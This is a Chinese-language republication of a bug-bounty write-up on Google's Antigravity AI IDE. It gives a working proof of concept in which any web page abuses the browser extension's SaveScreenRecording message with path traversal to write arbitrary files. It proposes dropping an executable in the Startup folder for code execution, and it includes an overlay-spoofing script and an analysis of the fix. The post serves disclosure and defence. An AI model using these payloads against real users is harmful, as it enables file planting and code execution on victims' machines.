#  谷歌人工智能代码编辑器 Antigravity 中的远程代码执行漏洞 - 10000 美元赏金  
 Ots安全   2026-03-02 12:46  
  
**威胁简报**  
  
  
**恶意软件**  
  
  
**漏洞攻击**  
  
几周前，谷歌发布了一款名为Antigravity 的全新 IDE 。根据推特上的讨论和各种消息，大家可能已经知道，它的内部运作机制和其他方面都与 Windsurf IDE 完全相同。  
  
每当有新的AI浏览器、集成开发环境或工具上市，就会引发一场寻找第一个有影响力的漏洞的竞赛。这次@s1r1us忙着开发一些很酷的东西，所以轮到我来寻找切入点并着手研究了。  
  
这款谷歌集成开发环境（IDE）自带浏览器。根据我们以往的经验，这是一个极具吸引力的目标。以下简要介绍 Antigravity IDE 的工作流程及其与浏览器的集成方式：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0ERjhLVgNlPFS2u1TC1SdPUGeBEIanYPW1fpxDfZtJb2mdRC5jkVh0YibF6gPQNb2WxpaIPHDobpew8c11XKyLPsXefKhdXC1kc/640?wx_fmt=webp&from=appmsg "")  
  
这里使用了一个 VS Code 扩展，它与一个语言服务器交互。这个服务器公开了一系列 API 调用，负责处理任何任务，无论这些任务来自 IDE 还是其他来源。  
  
使用像procexp.exe这样的工具，我们可以全面了解 Antigravity IDE 正在执行的内容。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0HANM77dTkPqibpiaTqf6jIEoL3ZCwWMFgNORrSZiaNNqmna5gHPTopqhmYAia6kJticxWdK4VibicnUHraUgjtuvFnkBTeW9SSlHjqT0/640?wx_fmt=other&from=appmsg "")  
  
首先是语言服务器：  
  
```
d:\\Antigravity\\resources\\app\\extensions\\antigravity\\bin\\language_server_windows_x64.exe --enable_lsp --extension_server_port 19116 --csrf_token e8d42e20-02b4-4ec8-9156-6ce5d35d0f01 --random_port --cloud_code_endpoint <https://daily-cloudcode-pa.googleapis.com> --app_data_dir antigravity --parent_pipe_path \\\\.\\pipe\\server_8a46fdeaf98e6c96
```  
  
  
该二进制文件负责运行服务器。端口号在extension_server_port参数中指定，每次运行端口号都是随机的。添加 CSRF 令牌标志是为了防范基于 DNS 重绑定的攻击，类似于@s1r1us发现的那些攻击。  
  
语言服务器二进制文件也会调用该node.exe二进制文件。查看命令行，我们可以看到以下内容。  
  
```
C:\Users\STARK-PC\AppData\Local\ms-playwright-go\1.50.1\node.exeC:\Users\STARK-PC\AppData\Local\ms-playwright-go\1.50.1\package\cli.jsrun-driver
```  
  
  
它使用了 Playwright，用于控制浏览器自动化。IDE 的核心就在language_server_windows_x64.exe这里，它是用 Golang 编写的。  
  
在对 IDE 进行一番摸索并寻找潜在的陷阱之后，我总结出了以下两个切入点，它们应该能让我做出足够有影响力的东西。  
  
Pwn 语言服务器  
  
通过找到泄露 CSRF 令牌的方法，应该可以轻松实现这一点。CSRF 令牌用于防御基于 DNS 重绑定的攻击。添加此保护措施正是为了应对 s1r1us 之前指出的问题。  
  
语言服务器会验证每个传入请求的x-codeium-csrf-token请求头。  
  
第一步是了解 CSRF 令牌是如何生成的。通过检查扩展程序的源代码resources/app/extensions/antigravity/dist/extension.js，我们可以找到相关的代码路径：  
  
```
const n = crypto.randomUUID();await R.ExtensionServer.initialize(e, n)[...][...]t.startLanguageServer = asyncfunction(e, t) {   s = ["--enable_lsp", "--extension_server_port", e.extensionServerPort.toString(), "--csrf_token", e.csrfToken]
```  
  
  
根据randomUUIDMDN 对该方法的描述，我们可以假设它是安全的，并且是不可预测的，这与Math.random使用的情况不同。  
  
加密：randomUUID() 方法 - Web API | MDN  
  
为了查找 CSRF 令牌可能泄露的地方，我决定对语言服务器二进制文件执行字符串操作，并检查 CSRF 令牌值的使用方式。我搜索了诸如 `<command>` csrf token、csrftoken`<command>` 等模式。  
  
我发现了一些有趣的占位符。查看第[1]行，它使用了一个字符串格式化程序，其值可能是一个 JSON 对象。如第[2]行所示，它访问了该request.csrfToken属性。根据注释，很明显这段脚本被注入到了浏览器中。  
  
```
(program  (namespace_definition    name: (namespace_name) @name) @definition.namespace) @codeium.lineage_node    (asyncfunction() {      try {        // Directly set the credentials in the service worker's global scope        const request = %s; // [1]        // Use the direct functions (Playwright compatibility)        if (typeof globalThis.setCredentials === 'function') {          await globalThis.setCredentials(request.csrfToken, request.serverAddress); // [2]          // Initialize the RPC client if the function exists          if (typeof globalThis.initializeRpcClient === 'function') {            globalThis.initializeRpcClient();            // TODO(b/450106975): Post launch, figure out why we call initializeRpcClient here and in the background.ts. One of the calls is redundant.          }          return { success: true, message: 'WindsurfBrowser API initialized successfully' };        } else {          return { success: false, message: 'WindsurfBrowser API not available' };        }      } catch (error) {        console.error('Error setting credentials:', error);        return { success: false, message: 'Error: ' + error.toString() };      }    })()
```  
  
  
我还可以看到类似这样的调用与 CSRF 令牌有关。  
  
```
google3/third_party/jetski/extension_server_pb/extension_server_go_proto.(*LanguageServerStartedRequest).GetCsrfTokengoogle3/third_party/jetski/extension_server_pb/extension_server_go_proto.(*LanguageServerStartedRequest).SetCsrfToken
```  
  
  
然而，为了更好地理解语言服务器，我们需要对这个 Golang 二进制文件进行逆向工程。目前，我们暂且不讨论这个问题。  
  
由于 CSRF 令牌被用于剧本创作中，我决定检查一下浏览器，所以我们直接进入正题。首次打开集成浏览器时，系统会提示您安装扩展程序。  
  
Antigravity 浏览器扩展程序 - Chrome 网上应用商店   
https://chromewebstore.google.com/detail/antigravity-browser-exten/eeijfnjmjelapkebgockoeaadonbchdd?pli=1  
  
此扩展程序使 AI 代理能够与浏览器中打开的网站进行交互。安装扩展程序后，您可以进行一些尝试，例如，在聊天窗口中输入“打开 example.com”之类的提示，并将背景颜色更改为蓝色。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0Ejea7raaFunns8Eyg6MJWUbs4DQKb8vCrJxo3snyLsAM6cv3Hoia72InbI6SnYmaUibe6Bor7aBm1esHZcicOibmpibeMPeNbmUJ9g/640?wx_fmt=webp&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0Hibjr1KGVMeQAlOoq7T94Xm4WlHToYMpyYWn2icjh0tqU7L3Tvvz7fice0T2PrReeuW8peRwBYLryhsZK4CicWKiamcJ2mPImUaDFk/640?wx_fmt=webp&from=appmsg "")  
  
这看起来很有意思，也引出了一个问题：它是如何控制这一切的？还记得之前我们看到它node.exe被调用来运行cli.js剧作家的脚本吗？我们实际上可以调试一下，更好地了解发生了什么。  
  
为了调试cli.js脚本，我们可以修改代码以启用调试功能，或者尝试放置一个代理，在执行时node.exe附加参数。然而，还有一种更简单的方法，无需任何设置。--inspectcli.js  
  
我们还可以看到，它--remote-debugging-port在启动浏览器进程时使用了该标志。  
  
```
"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --remote-debugging-port=9223 --user-data-dir="C:\\Users\\STARK-PC\\.gemini\\antigravity-browser-profile" --disable-fre --no-default-browser-check --no-first-run --auto-accept-browser-signin-for-tests --ash-no-nudges --disable-features=OfferMigrationToDiceUsers,OptGuideOnDeviceModel --flag-switches-begin --flag-switches-end
```  
  
  
我之前提到的更简便的方法是直接获取要调试的 Node 进程的PID40632 。就我而言，它是，所以我会在终端中执行以下命令。  
  
```
node -e "process._debugProcess(40632)"
```  
  
  
然后chrome://inspect/用浏览器打开。这样我们就能调试这个cli过程了。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0FibnQicWPpibsicuN4nrv7GYLDFUIiaSHt3gudD5nbiczgWmuC3BdjwichmTcAoib5ezyAEA2RfibjibrHjNCCMAu89ickggHicIp52J5gWYE/640?wx_fmt=webp&from=appmsg "")  
  
在扩展服务工作线程中，我们可以找到一些关于 CSRF 令牌使用的引用chrome-extension://eeijfnjmjelapkebgockoeaadonbchdd/service_worker_binary.js。在第[5]行，可以看到它将指定的值设置this.Z到x-codeium-csrf-token键中。追溯这个值，我们会发现该self.setCredentials方法，该函数的第一个参数应该包含 CSRF 令牌的值。  
  
```
self.setCredentials = function(a, b){    return va(function(c){        eh = { // [1]            Z: a,            V: b        };functionoh(){    if (!eh)        throw Error("Cannot initialize RPC client: no credentials");    var a = eh // [2]      , b = a.Z;    ya: [new nh(b,a)], // [3]    ...functionnh(a, b){    this.Z = a; // [4]    ...nh.prototype.intercept = function(a, b){    a.metadata["x-codeium-csrf-token"] = this.Z; // [5]
```  
  
  
现在，搜索setCredentials调用位置却没有任何结果。这很奇怪，因为如果是这样，这个扩展程序究竟是如何获得 CSRF 令牌的呢？答案就在我们之前从语言服务器二进制文件的字符串结果中获取的脚本里。  
  
```
const request = %s; // [1]        // Use the direct functions (Playwright compatibility)        if (typeof globalThis.setCredentials === 'function') {          await globalThis.setCredentials(request.csrfToken, request.serverAddress); // [2]          // Initialize the RPC client if the function exists          if (typeof globalThis.initializeRpcClient === 'function') {            globalThis.initializeRpcClient();
```  
  
  
这样就一切都清楚了。上述代码被注入到 Antigravity 扩展的上下文中，globalThis.setCredentials与之前的代码相同self.setCredentials，并且第一个参数显然是 CSRF 令牌。  
  
要在浏览器中查看 Playwright 注入的内容脚本，我们需要在开发者工具中启用一个默认未启用的选项。在“源代码”→“搜索”下，启用“搜索匿名脚本和内容脚本” 。我从Masato Kinugawa 的研究中了解到这个技巧。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0GOLfrvnKI2f8ggk5SAJrJ5r2G9OljMPDeialU0sznlxdb3cEtUezlib8hFFZO49cIicicX9SibgB55pErsfib0tiaYBo28up6A2rdeo4/640?wx_fmt=webp&from=appmsg "")  
  
现在，如果您搜索evaluate(，应该会看到一些结果；如果不启用该选项，则不会看到任何结果。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0HGUnBXBnZfXISYyzymvScNFyUnLHc3A5icOTNoY7vghc8rDo7lvcjiazyVuIYdSPrjkSCZmkSX1tNjBNPiaWP2d1P4BHK8xw3L5k/640?wx_fmt=webp&from=appmsg "")  
  
我在这里设置了一个断点，因为此方法负责将注入的内容脚本执行到页面中。这部分代码来自 Playwright 核心包，地址为https://github.com/microsoft/playwright/blob/1eba405f948b93d4d40da0c2b8ace3d9fcd766c9/packages/injected/src/utilityScript.ts[#L64]()  
  
  
```
var UtilityScript = class {  constructor(isUnderTest) {    this.serializeAsCallArgument = serializeAsCallArgument;    this.parseEvaluationResultValue = parseEvaluationResultValue;    if (isUnderTest)      this._setBuiltins();  }  evaluate(isFunction, returnByValue, expression, argCount, ...argsAndHandles) {    const args = argsAndHandles.slice(0, argCount);
```  
  
  
该方法的第二个参数包含以下值：evaluate、expression  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0GqJukjZ4bLeTdFj5hoticPS1lMgMPnYnwia1hotJWlqvP1JBeCZicRQwwoCot3LwXK3ibu8jnZ8pQqtKU1G1l5Z3uWZf8icHicibTlico/640?wx_fmt=webp&from=appmsg "")  
  
```
// Directly set the credentials in the service worker's global scopeconst request = {"action":"setCredentials","csrfToken":"f5d969c7-f4f3-4f87-aca7-8fa1568b6bd5","serverAddress":"http://127.0.0.1:64431"};
```  
  
  
看到这种情况，我想确认是否有可能在网页上下文中执行了相同的脚本。然而，结果表明它仅在扩展服务工作线程的上下文中执行。因此，不存在泄露 CSRF 令牌的可能性。  
  
通过随意使用 Antigravity 代理的预期功能与网页进行交互，我可以实时查看哪些类型的脚本等被注入到普通页面中。  
  
有时，这些注入的脚本可能拥有额外的权限，而且可能仅在非常有限的时间内有效。例如，我就发现了一个这样的案例。  
  
```
window.updateActuationOverlay({  "awaitingUserInput": false,  "cascadeId": "64821e8c-385d-452d-ba6b-3eb9fe597065",  "displayString": "Executing JavaScript..."})
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0Hmic71asnybEr8lOicQetooL5awhF6iaUJibvbaVdsJCFOia6IuUvEvXqpb7Q8NKBtTIibhQWleNItQBejEickawUk440zkKOObPpriaA/640?wx_fmt=webp&from=appmsg "")  
  
updateActuationOverlay用于在浏览器窗口中显示代理消息。例如，在上面的屏幕截图中，您可以看到它显示“代理需要您的输入”。  
  
我们可以再次搜索该方法名称，以在隐藏内容脚本中找到它的声明。该方法除了显示关于AI代理的叠加提示外，不做任何其他操作。  
  
```
window.updateActuationOverlay = t => {            Ga && clearTimeout(Ga);            const e = document.getElementById($a);            if (!e)                returnPromise.reject(newError("Failed to find shadow host"));            const n = e.shadowRoot;            if (!n)                returnPromise.reject(newError("Failed to find shadow root"));            const r = {                ...Za,                ...t            };            Za = "" === t.cascadeId ? {                ...qa,                ...t            } : r;            const i = n.querySelector("#preact-border-container");            return i && (0,            o.XX)(za(Xa, {                ...Za            }), i),            Za.cascadeId && (Ga = setTimeout( () => {                Za = {                    ...qa                },                i && (0,                o.XX)(za(Xa, {                    ...Za                }), i)            }            , 3e4)),            Ka()        }
```  
  
  
此方法仅在代理处于运行模式时可用，并且只能临时使用；您可以看到蓝色边框线作为指示。  
  
为了验证我的假设，我将以下代码部署在我的服务器上，并指示代理执行一项任务。下面的代码调用一个updateActuationOverlay方法，并传入一个任意的displayString键值，该方法大约每 10 毫秒执行一次。  
  
```
<script>  setInterval(() => {    window.updateActuationOverlay({      awaitingUserInput: true,      cascadeId: "95651fd4-cc10-4e03-884d-f31953b7a13d",      displayString: "Shirley: Hello there sudi ;)",      passthroughEnabled: false    });  }, 10);</script>
```  
  
  
没花多少时间就确认了😛  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0HQT09uJs81ia8mQn3K7Pm9zE4R46uuZQRwDQzx2xiaEEiaY65C4f2Uogk7hndialouacU9tq5zJQnrqj8vJ2iaria6qJTJ6bNr0x4ZU/640?wx_fmt=webp&from=appmsg "")  
  
除此之外，我还花了不少时间思考是否还有其他方法能让我造成更大的影响。由于我们的目标是浏览器，所以类似通用 XSS 攻击之类的方案应该也很有效果。但可惜的是，我没找到任何类似的方案，而且所有方案似乎都局限于 UI 功能，非常有限。  
  
这次尝试失败了，因为最终我没能在那里找到任何有价值的信息，但我仍然想分享一下细节。  
  
攻破浏览器扩展程序？  
  
然后我转而尝试使用浏览器扩展程序，希望能至少在那里找到一些线索。  
  
从扩展程序源代码开始，审核扩展程序时我首先查看的就是该manifest.json文件。  
  
此处的属性externally_connectable设置为所有 URL，这意味着允许白名单来源通过chrome.runtime.connect()/与扩展程序通信。如果您想了解我们是如何攻破 Comet 浏览器的，chrome.runtime.sendMessage() 请参阅https://www.hacktron.ai/blog/perplexity-comet-uxss了解更多详情，该浏览器的此属性设置了过于宽松的来源。  
  
```
"externally_connectable": {      "matches": [ "\\u003Call_urls>" ]   }
```  
  
  
相关 postMessage 处理可以在这里找到。 chrome-extension://eeijfnjmjelapkebgockoeaadonbchdd/service_worker_binary.js  
  
```
chrome.runtime.onMessageExternal.addListener(function(a, b, c){    mh().then(function(){        return qh(a, b)
```  
  
  
我将总结一下你在这里可以采取的所有行动。  
  
```
functionqh(a, b) {    var c, d, e, g, f, h, k, l, m, q, p, u, x, t, B;    return va(function(n) {        switch (n.g) {        case1:            if (a.action !== "rpcCall") {            }            [...]            return z(n, ah(d), 4);        case4:        case3:            if (c.method !== "validateCascadeOrCancelOverlay") {              [...]        case6:        case5:            if (c.method !== "smartFocusConversation") {              [...]        case8:        case7:        case2:            if (a && typeof a === "object" && a.action === "registerTargetID" && typeof a.targetId === "string") {              [...]            }            if (lg(a)) {                if (a.action === "getCurrentTabId")                    return n.return({                        tabId: ((l = b.tab) == null ? void0 : l.id) || null                    });                if (a.action === "serviceWorkerWakeUp")                if (a.action === "getMimeType")             [...]        case10:            return n.return(n.l);        case9:            if (!a || typeof a !== "object" || typeof a.type !== "string" || !["CHECK_JETSKI_CONNECTION", "ATTEMPT_JETSKI_CONNECTION"].includes(a.type)) {            if (a.type !== "CHECK_JETSKI_CONNECTION") {              [...]        case11:            if (!a || typeof a !== "object" || a.action !== "SaveScreenRecording" || typeof a.za !== "object" || typeof a.filename !== "string" || typeof a.L !== "string") {                n.g = 16;                break            }            B = new Qg;            Rg(B, newUint8Array(a.za));            cd(B, 2, a.filename);            cd(B, 3, a.L);            return z(n, dh(B).then(function() {}).catch(function() {}), 17);
```  
  
  
```
rpcCallvalidateCascadeOrCancelOverlaysmartFocusConversationregisterTargetIDgetCurrentTabIdserviceWorkerWakeUpgetMimeTypeCHECK_JETSKI_CONNECTIONSaveScreenRecording
```  
  
  
似乎有很多功能可以触发。内容脚本中包含一些示例代码，展示了如何调用其中一些操作。  
  
```
window.addEventListener("message", function(a){    a.origin === window.location.origin && a.source === window && (a = a.data) && typeof a === "object" && a !== null && (a.action === "rpcCall" ? chrome.runtime.sendMessage(a).catch(function(){}) : a.action === "proxyRpcCall" ? a.method && a.requestId && chrome.runtime.sendMessage(a).catch(function(){}) : a.action === "registerTargetID" ? a.targetId && typeof a.targetId === "string" && chrome.runtime.sendMessage({        action: "registerTargetID",        targetId: a.targetId    }).catch(function(){}) : a.action === "startScreenRecording" ? chrome.runtime.sendMessage(a).catch(function(){}) : a.action === "stopScreenRecording" && chrome.runtime.sendMessage(a).catch(function(){}))});
```  
  
  
SaveScreenRecording光看名字就觉得很有意思，所以我开始深入研究这个。这个操作是从……调用的  
  
chrome-extension://eeijfnjmjelapkebgockoeaadonbchdd/offscreen_binary.js  
  
```
if (c.g != 3) return h = c.o, k = newUint8Array(h), A(c, chrome.runtime.sendMessage({                                target: "background",                                action: "SaveScreenRecording",                                K: Array.from(k),                                filename: "screen-recording-" + Date.now() + ".webm",                                H: a                            }), 3);
```  
  
  
根据if消息处理代码中的条件检查，它还需要检查一些上述示例代码中不存在的属性，所以我逐一提取了消息属性。它要求属性值action等于某个值SaveScreenRecording，za键的类型为对象，filename值类型为字符串，最后值L也为字符串类型。  
  
```
const EXTENSION_ID = "eeijfnjmjelapkebgockoeaadonbchdd";chrome.runtime.sendMessage(EXTENSION_ID,{action:"SaveScreenRecording", za:{},"filename":"shirley",L:"aaa"})
```  
  
  
我反复尝试了很多次才找到正确的格式。结果发现，将示例代码中的键和上面提到的键结合起来，似乎就能跳转到下一个函数。  
  
za键似乎只和K 键一样。  
  
```
k = newUint8Array(h)K: Array.from(k)// By having the below type I could ensure it matches exactly as the eg code, this was a good hint as well it indicated that this key was for the file content?K: Array.from(new TextEncoder().encode(`shirley`))
```  
  
  
```
{action:"SaveScreenRecording","filename":"shirley",L:"aaa",za:Array.from(new TextEncoder().encode(`shirley`))}
```  
  
  
调用最终到达此处，它会向语言服务器的此端点发出请求， /exa.language_server_pb.LanguageServerService/SaveScreenRecording 并附带文件名、请求正文中发送的内容等参数。  
  
```
functiondh(a) {    var b = Z;    return b.H.J(b.g + "/exa.language_server_pb.LanguageServerService/SaveScreenRecording", a, {}, Ug, void0)}
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0Hzmatp5xkBC7qkRPKTyKfkI6jUrhibjAxBeaaHoZvtWpgR4pFRb5icyFZZGuv0cyaYib14sEYTkJ9JOjzpyy2SPcgRE9ib96dofPw/640?wx_fmt=webp&from=appmsg "")  
  
这是扩展程序发送的用于保存屏幕录制操作的请求。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0FggeiapTHibCZxdk62nkSOmFoOetshK5zial3d0KD3yFlibWU7ticJyAdPibmZichF6y5EpR88FXAiafcRUe6FQO81r62xeMef8kz45qo/640?wx_fmt=webp&from=appmsg "")  
  
这张截图中最引人注目的部分是响应标头，主要是grpc-message。  
  
保存视频文件失败：打开 C:\Users\STARK-PC.gemini\antigravity\brain\aaa\shirley：系统找不到指定的路径。  
  
此错误信息清楚地表明，它确实尝试将录制内容保存到指定位置。至于最终文件路径，我们有两个控制点。  
  
```
{  "action": "SaveScreenRecording",  "za": Array.from(new TextEncoder().encode(`shirley`)),  "filename": "shirley", // [1]  "L": "aaa", // [2]}
```  
  
  
```
*C:\Users\<Username>\.gemini\antigravity\brain\aaa\shirleyC:\Users\<Username>\.gemini\antigravity\brain\[2]\[1]*
```  
  
  
由于最终目录不存在，文件写入操作可能失败，因此我的下一步是查看它是否允许类似这样的路径遍历序列../。  
  
修改L键值后会../返回以下错误，导致路径异常。即使增加遍历序列数，仍然会返回相同的错误。  
  
保存视频文件失败：打开 Downloads\shirley 文件夹：系统找不到指定的路径。  
  
后来，我意识到路径中有两个注入点，我filename还可以在密钥中添加遍历序列。这最终成为了有效载荷。  
  
```
const content = "shirley: hey sudi, I love you ;)";const bytes = new TextEncoder().encode(content);const EXTENSION_ID = "eeijfnjmjelapkebgockoeaadonbchdd"; // <-- change thisfunctionsendRecording() {    chrome.runtime.sendMessage(        EXTENSION_ID,        {            action: "SaveScreenRecording",            filename: "../poc.txt",            za:Array.from(bytes),            L:"../../../test",        },        (response) => {            console.log("Response from Extension:", response);        }    );}sendRecording()
```  
  
  
就我而言，我的用户名是STARK-PCC:\Users\STARK-PC ，因此会在目录中创建一个新文件C:\Users\STARK-PC\poc.txt，其内容完全由我控制。端点响应也不再显示相同的错误。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0HNHcoKf1icfnMercsXIENjAcFAyseqzw369cAYHCBeE4hFVABgxVJ47D7APh5y5ibClO6PkFUb74icOFfUV4n96vu8OHM9Dh9ERY/640?wx_fmt=webp&from=appmsg "")  
  
还有一点需要指出：后来我发现，即使出现了这个错误，文件实际上也已经保存到了正确的遍历位置。不要盲目相信错误信息😛，它们在黑盒测试中有时会造成致命的后果。  
  
保存视频文件失败：打开 Downloads\shirley 文件夹：系统找不到指定的路径。  
  
这个漏洞基本上允许我们向受害者的电脑上任意写入任何文件，只要当前用户拥有写入权限即可。一个简单的代码执行途径是将任意可执行文件放入用户的启动文件夹，这样下次系统重启时，该文件就会自动执行。  
  
后置分析  
  
为了解决这个问题，谷歌在处理程序方法中添加了额外的检查。新增的sh[1]行方法会验证消息的来源和其他一些属性，以确保消息仅在扩展程序上下文中调用，而不是从任何恶意页面调用。  
  
```
case11:            if (!a || typeof a !== "object" || a.action !== "SaveScreenRecording" || typeof a.za !== "object" || typeof a.filename !== "string" || typeof a.L !== "string") {                n.g = 16;                break            }            if (!sh(b)) // [1]                return n.return({                    success: !1,                    error: "Unauthorized: SaveScreenRecording only accepted from offscreen document"                });            if (!Z) {                n.g = 17;                break            }            B = new Qg;            Rg(B, newUint8Array(a.za));            cd(B, 2, a.filename);            cd(B, 3, a.L);            return z(n, dh(B).then(function() {}).catch(function() {}), 17);
```  
  
  
```
functionsh(a) {    var b, c, d = (c = (b = a.url) == null ? void0 : b.includes("/static/offscreen.html")) != null ? c : !1;    b = a.id === chrome.runtime.id;    a = !a.tab;    return d && b && a}
```  
  
  
他们添加了以下检查。这里，a 该sh方法来自addEventListener回调函数（第二个参数是b）。  
  
如下所示，消息处理程序通过 `<returns>` 注册chrome.runtime.onMessageExternal.addListener，回调函数接收消息(a, b, c)。b然后，表示发送者的参数被传递下去，并最终由 `<validation>`sh方法进行验证。  
  
```
chrome.runtime.onMessageExternal.addListener(function(a, b, c){    mh().then(function(){        return qh(a, b)
```  
  
  
该方法中的第一个检查sh是：  
  
```
a.url // https://attacker.com/
```  
  
  
所以这个b.includes("/static/offscreen.html")检查很容易绕过。只需?/static/offscreen.html在网页 URL 中添加类似这样的内容，我们就能通过第一道检查。  
  
第二个检查是针对chrome.runtime.id 预期返回的值eeijfnjmjelapkebgockoeaadonbchdd （与扩展 ID 相同）进行的。  
  
最后一步检查该a.tab属性是否为 undefined 或 null；如果是，则结果为true。  
  
```
return d && b && a
```  
  
  
chrome.runtime.id如果你能在扩展程序的脚本内容中找到代理调用，或许也能绕过这个检查postMessage。这些代理调用通常看起来像这样：  
  
chrome-extension://<someid>/content-script.js  
  
由于内容脚本被注入到网页中，滥用这种代理可能会使消息看起来像是来自扩展上下文内部。  
  
```
window.addEventListener("message", function(a) {        chrome.runtime.sendMessage(a)    })
```  
  
  
即使你能找到类似这样的东西，以 Antigravity 为例，你可以看到类似的模式，但它对你可以指定的操作类型有一些检查，所以它并不完全是任意的。  
  
```
window.addEventListener("message", function(a){    a.origin === window.location.origin && a.source === window && (a = a.data) && typeof a === "object" && a !== null && (a.action === "rpcCall" ? chrome.runtime.sendMessage(a).catch(function(){}) : a.action === "proxyRpcCall" ? a.method && a.requestId && chrome.runtime.sendMessage(a).catch(function(){}) : a.action === "registerTargetID" ? a.targetId && typeof a.targetId === "string" && chrome.runtime.sendMessage({        action: "registerTargetID",        targetId: a.targetId    }).catch(function(){}) : a.action === "startScreenRecording" ? chrome.runtime.sendMessage(a).catch(function(){}) : a.action === "stopScreenRecording" && chrome.runtime.sendMessage(a).catch(function(){}))});
```  
  
  
最后一项检查a.tab无法使结果为真。tab只有当消息直接从扩展程序内部调用时（例如从 Service Worker 调用），该属性才会为 undefined。即使是从内容脚本调用，该tab属性也包含在内。因此，即使我们能够绕过前两项检查，第三项检查仍然会阻碍我们。  
  
结论  
  
随着人工智能浏览器的日益普及，攻击面也显著扩大。浏览器代理程序运行所需的特权API，恰恰是其安全防护不当时最危险的根源所在。  
  
这是我们评测的第三款人工智能浏览器，前两款都存在权限设置过于宽松的问题，导致强大的API接口暴露在外。我们相信还有其他浏览器也存在类似问题。做好浏览器安全防护并非易事——即使是经验丰富的团队也难以应对。除非你与像谷歌、OpenAI或Perplexity这样高度重视安全的团队合作，否则在安装那些看似全新的人工智能浏览器之前，请务必三思。  
  
**END**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0Ggo73JZrs5VvHqvYPxsK9WaxHibkWCstJx1kPON6fGRJLAktubaHt1wJZyL0wjLBHq9M7NQehbCA6gUZCcMasxUiby7Se0fzbibY/640?wx_fmt=jpeg&from=appmsg "")  
  
  
公众号内容都来自国外平台-所有文章可通过点击阅读原文到达原文地址或参考地址  
  
排版 编辑 | Ots 小安   
  
采集 翻译 | Ots Ai牛马  
  
公众号 |   
AnQuan7 (Ots安全)  
  
